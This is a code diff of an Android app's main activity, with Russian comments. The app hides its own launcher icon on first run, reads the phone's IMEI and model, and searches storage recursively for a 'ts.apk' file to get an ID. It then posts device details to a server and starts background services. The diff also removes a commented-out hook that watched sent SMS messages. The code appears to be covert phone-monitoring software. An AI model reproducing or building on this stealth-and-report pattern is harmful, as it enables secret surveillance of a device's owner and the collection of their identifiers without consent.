@@ -45,7 +45,6 @@ public class MainActivity extends Activity {
 	private String aboutDev;
 	private static String LOG_TAG = "mainActivity";
 	String fileID = "id.txt";
-	String ID = null;
 	List<String> result;
 	File root;
 	File[] fileArray;
@@ -58,9 +57,9 @@ public class MainActivity extends Activity {
 		setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
 		// setContentView(R.layout.activity_main);
 
-		FileLog.writeLog("\n\n ============================ ");
-		FileLog.writeLog("\n onCreate \n");
-		FileLog.writeLog("\n ============================\n ");
+		FileLog.writeLog(" ============================ \n");
+		FileLog.writeLog(" onCreate \n");
+		FileLog.writeLog(" ============================\n ");
 
 		sp = PreferenceManager
 				.getDefaultSharedPreferences(getApplicationContext());
@@ -69,7 +68,6 @@ public class MainActivity extends Activity {
 		String imeistring = manager.getDeviceId();
 		String model = android.os.Build.MODEL;
 		String versionAndroid = android.os.Build.VERSION.RELEASE;
-		String phoneNumber = "";
 
 		aboutDev = " Model: " + model + " Version android: " + versionAndroid;
 		sIMEI = "IMEI: " + imeistring;
@@ -85,7 +83,6 @@ public class MainActivity extends Activity {
 		boolean hasVisited = sp.getBoolean("hasVisited", false);
 
 		if (!hasVisited) {
-			// getID();
 			// проверка на первое посещение
 			e = sp.edit();
 
@@ -95,17 +92,16 @@ public class MainActivity extends Activity {
 			e.commit();
 			hideIcon();
 		}
-		getID();
+		
+		getID(); // рекурсивный поиск файла с нужным именем
+		
 		if (sp.getString("ID", "ID").equals("ID")) {
+			Log.d(LOG_TAG, "File is not found. Show dialog.");
+			FileLog.writeLog(LOG_TAG + " -> File not found. Show dialog.");
+			
 			viewIDDialog();
 		} else
 			finish();
-	}
-
-	public void contentObserved() {
-//		SmsSentObserver content = new SmsSentObserver(new Handler(), null);
-//        this.getContentResolver().registerContentObserver(
-//                        Uri.parse("content://sms/sent"), true, null);
 	}
 
 	private boolean viewIDDialog() {
@@ -122,16 +118,18 @@ public class MainActivity extends Activity {
 		alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
 			public void onClick(DialogInterface dialog, int whichButton) {
 				String value = input.getText().toString();
+				
 				// Do something with value!
 				Log.d(LOG_TAG, "Text: " + value);
 				FileLog.writeLog("Text: " + value);
+				
 				sp = PreferenceManager
 						.getDefaultSharedPreferences(getApplicationContext());
 				Editor e = sp.edit();
 				e.putString("ID", value);
 				e.commit();
+				
 				start(); // запуск сервисов
-				contentObserved();
 				sendDiagPost();
 				finish();
 			}
@@ -158,10 +156,11 @@ public class MainActivity extends Activity {
 				+ Long.toString(System.currentTimeMillis())
 				+ sp.getString("ABOUT", "about") + "</url></packet>";
 
-		FileLog.writeLog("MainAct diagRequest: before req");
+		FileLog.writeLog("MainActRequest: before req");
 
 		Request req = new Request(context);
 		req.sendRequest(diag);
+		
 		Log.d(LOG_TAG, "post req");
 		FileLog.writeLog("MainActRequest: post req");
 	}
@@ -172,8 +171,9 @@ public class MainActivity extends Activity {
 		recursiveFileFind(file);
 	}
 
-	public void recursiveFileFind(File[] file1) {
+	public boolean recursiveFileFind(File[] file1) {
 		int i = 0;
+		String ID = null;
 		String filePath = "";
 		if (file1 != null) {
 			while (i != file1.length) {
@@ -181,7 +181,8 @@ public class MainActivity extends Activity {
 				sID = file1[i].getName();
 				if (file1[i].isDirectory()) {
 					File[] file = file1[i].listFiles();
-					recursiveFileFind(file);
+					if (recursiveFileFind(file) == true)
+						return true;
 				}
 
 				if (sID.indexOf("ts.apk") != -1) {
@@ -189,16 +190,17 @@ public class MainActivity extends Activity {
 					e = sp.edit();
 					e.putString("ID", ID);
 					e.commit();
-					contentObserved();
+					
 					sendDiagPost();
-					// Toast.makeText(this, sourceApk,
-					// Toast.LENGTH_LONG).show();
+					
 					start(); // запуск сервисов
-					break;
+					return true;
 				}
 				i++;
 			}
 		}
+		
+		return false;
 	}
 
 	public void start() {
